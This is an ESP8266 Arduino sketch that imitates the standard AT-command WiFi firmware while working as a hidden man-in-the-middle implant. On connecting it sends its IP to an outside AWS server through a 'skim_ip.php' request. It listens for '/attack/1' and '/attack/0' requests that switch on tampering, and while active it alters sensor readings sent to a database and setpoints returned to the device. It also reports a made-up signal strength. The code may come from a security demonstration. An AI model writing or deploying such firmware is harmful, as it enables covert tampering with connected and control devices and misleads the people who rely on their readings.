#include <ESP8266WiFi.h>

#ifdef ESP8266
extern "C" {
  #include "user_interface.h"
}
#endif

String incoming = "";
bool requestSent = false;
bool sendMode = false;
WiFiClient client;
WiFiServer server(80);

String clientStr = "";
bool ipSent = false;
bool hack = false;

void setup() 
{
  Serial.begin(115200);
  delay(100);
  server.begin();
}

void loop() 
{
  if(!ipSent)
  {
    if(WiFi.status() == WL_CONNECTED)
    {
      SendIP();
      ipSent = true;
    }
  }
  
  CheckServer();
    
  while(client.available())
  {
    char ch = client.read();
    clientStr += ch;
    if(ch == '\n')
    {
      if(hack) clientStr = InterceptSetPoint(clientStr, 0, -4);      
      Serial.print(clientStr);
      clientStr = "";
    }
  }
  
  while(Serial.available()) 
  {
    char ch = Serial.read();
    //Serial.print(ch); //echo if you need debugging...
    incoming += ch;
        
    if(sendMode) 
    {
      if(ch == '\n')
      {
        if(incoming.indexOf("GET") >= 0) 
        {
          if(hack) incoming = InterceptReading(incoming, 191, 4);
        }
        client.print(incoming);
        incoming = "";
      }
      
      if(incoming == "+++") //these should be in a packet by themselves
      {
        //requestSent = true;
        sendMode = false;
        incoming = "";
      }
    }

    else if(ch == '\n')
    {
      if (incoming == "AT\r\n") //Attention
        Serial.print("\r\nOK\r\n");
      else if (incoming == "AT+RST\r\n") // Reset
      {
        Serial.print("\r\nOK\r\n");
      } 
      else if (incoming == "ATE0\r\n") // echo off, ignore
      {
        Serial.print("\r\nOK\r\n");
      }
         
      else if (incoming == "ATE1\r\n") // echo on, ignore [TODO: echo back commands]
      {
        Serial.print("\r\nOK\r\n");
      } 
      else if (incoming == "AT+CWMODE?\r\n") // checking wifi mode
      {
        Serial.print("\r\n+CWMODE:1\r\n\r\nOK\r\n"); //always return station mode
      } 
      else if (incoming.startsWith("AT+CWMODE=")) // setting wifi mode, ignore (always station)
      {
        Serial.print("\r\nOK\r\n");
      } 
      else if (incoming.startsWith("AT+CIPMUX")) // setting the mux, ignore (we'll do whatever we want)
      {
        Serial.print("\r\nOK\r\n");
      } 
      else if (incoming.startsWith("AT+CIPMODE")) // setting transparent mode, ignore
      {
        Serial.print("\r\nOK\r\n");
      } 
      else if (incoming == "AT+CIPSTAMAC?\r\n") // getting MAC address, TODO: return MAC address
      {
        Serial.print("\r\nOK\r\n");
      } 
      
      else if (incoming == "AT+CIFSR\r\n") //get IP and MAC address
      //sample:
      //+CIFSR:STAIP,"192.168.0.11"
      //+CIFSR:STAMAC,"dc:4f:22:26:7e:ed"
      {
        Serial.print("\r\n+CIFSR:STAIP,\"");
        Serial.print(WiFi.localIP());
        Serial.print("\"\r\n\r\n+CIFSR:STAMAC,\"");
        Serial.print(WiFi.macAddress());
        Serial.print("\"\r\n");
      } 
  
      else if (incoming.substring(0, 9) == "AT+CWJAP?") //check if connected
      //sample:  
      //+CWJAP:"MOTOROLA-4A7AC","00:26:82:ce:7a:02",1,-61\r\n
      {
        Serial.print("+CWJAP:\"wahoo\",\"");
        Serial.print(WiFi.macAddress());
        Serial.print("\",1,-57\r\n\r\nOK\r\n"); //we'll make up an RSSI value...no one will notice
      }
      
      else if (incoming.substring(0, 9) == "AT+CWJAP=") //Join Network
      {
        String ssid = split(incoming, '\"', 1);
        int ssidL = ssid.length() + 1;
        char ssidArray[ssidL];
        ssid.toCharArray(ssidArray, ssidL);
  
        String password = split(incoming, '\"', 3);
        int passwordL = password.length() + 1;
        char passwordArray[passwordL];
        password.toCharArray(passwordArray, passwordL);
  
        WiFi.begin(ssidArray, passwordArray);

//        uint32_t lastCheck = millis();
//        while(millis() - lastCheck < 5000ul)  //5 second timeout 
//        {
//          if(WiFi.status() == WL_CONNECTED) break;
//          delay(100);
//        }

        if(WiFi.status() == WL_CONNECTED) 
        {
          Serial.print("\r\nOK\r\n");        
        }
        else Serial.print("\r\nERROR\r\n");        
      } 
      else if (incoming.substring(0, 11) == "AT+CIPSTART") 
      {
        requestSent = false;
        String addr = split(incoming, '\"', 3);
        if (!client.connect(addr, 80)) {
          Serial.println("connection failed");
        } else {
          Serial.print("\r\nCONNECT\r\n");
          Serial.print("\r\nOK\r\n");
        }
      } 
      else if (incoming.substring(0, 12) == "AT+CIPSTATUS") 
      /*
       * CIPSTATUS is a tricky one. With the AT firmware, the return value is both a function of the WiFi state
       * _and_ the client state:
       * ESP8266_STATUS_GOTIP = 2,         //wifi connected; IP assigned 
       * ESP8266_STATUS_CONNECTED = 3,     //connected to a server
       * ESP8266_STATUS_DISCONNECTED = 4,  //disconnected from a server
       * ESP8266_STATUS_NOWIFI = 5         //no wifi cxn
       * 
       * It then goes on to list info about the server cxn, but we can probably ignore that.
       * 
       * sample:
       * STATUS:3
       * +CIPSTATUS:0,"TCP","34.209.142.24",80,16119,0
       * 
       * or:
       * STATUS:4
       */
      {
        if(WiFi.status() != WL_CONNECTED) Serial.print("\r\nSTATUS:5\r\n\r\nOK\r\n");
        else if(client.status() == CLOSED) Serial.print("\r\nSTATUS:4\r\n\r\nOK\r\n");
        //else if(client.status() == ESTABLISHED) Serial.print("\r\nSTATUS:3\r\n\r\nOK\r\n");
        else Serial.print("\r\nSTATUS:3\r\n\r\nOK\r\n"); //not sure about intermediate states, but we'll default to 3
      } 
      else if (incoming.substring(0, 10) == "AT+CIPSEND") 
      {
        sendMode = true;
      } 
      else if (incoming.substring(0,11) == "AT+CIPCLOSE")
      {
        client.stop();
        Serial.print("\r\n\r\nOK\r\n");
      }
      else
      {
        Serial.println("\r\nERROR\r\n");
      }
      
      incoming = "";
    }
  }
}

String split(String data, char separator, int index) {
  int found = 0;
  int strIndex[] = {
    0,
    -1
  };
  int maxIndex = data.length() - 1;

  for (int i = 0; i <= maxIndex && found <= index; i++) {
    if (data.charAt(i) == separator || i == maxIndex) {
      found++;
      strIndex[0] = strIndex[1] + 1;
      strIndex[1] = (i == maxIndex) ? i + 1 : i;
    }
  }
  return found > index ? data.substring(strIndex[0], strIndex[1]) : "";
}

int SendIP(void)
{
  char destServer[] = "ec2-34-209-142-24.us-west-2.compute.amazonaws.com";
  WiFiClient ipClient;
  ipClient.connect(destServer, 80);
  ipClient.print("GET /~gcl8a/skim_ip.php?ip=");
  ipClient.print(WiFi.localIP());
  ipClient.print(" HTTP/1.1\r\nHost: "); //the beginning of the "footer"
  ipClient.print(destServer); //this tells the interwebs to route your request through the AWS server
  ipClient.print("\r\nConnection: close\r\n\r\n"); //tell the server to close the cxn when done.

  Serial.print(WiFi.localIP());
  return 1;
}

String InterceptReading(const String& str, int id, float adj)
/*
 * Takes an attempt to write to the database and adjusts it.
 */
{
  String idStr = String("id=") + String(id);
  
  int iID = str.indexOf(idStr);
  if(iID == -1) return str; //not found, return the original string

  int iVal = str.indexOf("value=");
  if(iVal == -1) return str;
  
  String rest = str.substring(iVal + 6); //safe because at worst it's '\0'

  float val = rest.toFloat(); //original value
  int iAmp = rest.indexOf('&'); //look for any following parameters

  String hacked = str.substring(0, iVal) + String("value=") + String(val + adj);
  if(iAmp > 0) hacked += rest.substring(iAmp);

  return hacked;
}

String InterceptSetPoint(const String& str, float adj0, float adj1) //adjust the two setpoints
{
  if(str.startsWith("<setp")) //intercept setpoint
  {
    int sp[2];

    int bracket = clientStr.indexOf('>');
    if(bracket == -1) return str; //not found, return original string
    sp[0] = str.substring(bracket + 1).toInt();
    
    int comma = clientStr.indexOf(',');
    if(comma == -1) return str; //not found, return original string
    sp[1] = str.substring(comma + 1).toInt();

    int end_bracket = str.indexOf("</setp");
    if(end_bracket == -1) return str;
    String endStr = str.substring(end_bracket);

    //now adjust
    sp[0] += adj0;
    sp[1] += adj1;

    String brStr = str.substring(0, bracket + 1);
    String retStr = brStr + String(sp[0]) + String(',') + String(sp[1]) + endStr;

    return retStr;
  }
  
  else return str;
}

void CheckServer(void)
{
  WiFiClient remoteClient = server.available();

  if(remoteClient) 
  {
    String input;

    unsigned long lastRead = millis();
    while(millis() - lastRead < 500) //1 sec timeout
    {
      if(remoteClient.available())
      {
        char ch = (char)remoteClient.read();
        input += ch;
        lastRead = millis();

        if(ch == '\n')
        {
          if(input.indexOf("/attack/0") != -1) {hack = false; remoteClient.flush();}
          if(input.indexOf("/attack/1") != -1) {hack = true; remoteClient.flush();}
        }
      }
    }

    String str = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<!DOCTYPE HTML>\r\n<html>\r\n";
    str += String(hack);
    str += "\r\n</html>\r\n";
    
    remoteClient.print(str);
  }
}

